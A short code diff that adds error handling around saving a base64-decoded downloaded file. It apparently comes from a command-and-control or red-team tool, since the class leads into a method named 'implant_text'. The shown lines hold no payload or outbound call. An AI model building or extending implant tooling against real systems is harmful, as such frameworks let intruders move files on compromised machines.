@@ -35,10 +35,13 @@ class DownloadFile:
 
         filename = secrets.token_hex(3)
         download_file_path = f"{Settings.file_download_folder}downloaded_file_{filename}"
-        with open(download_file_path, 'wb') as file_h:
+        try:
+            with open(download_file_path, 'wb') as file_h:
 
-            file_h.write(base64.b64decode(data))
-        return f"File downloaded: {args}\nFile saved to {download_file_path}", None
+                file_h.write(base64.b64decode(data))
+            return f"File downloaded: {args}\nFile saved to {download_file_path}", None
+        except Exception as e:
+            return "File download failed.", None
 
     def implant_text(self):
         var = '''
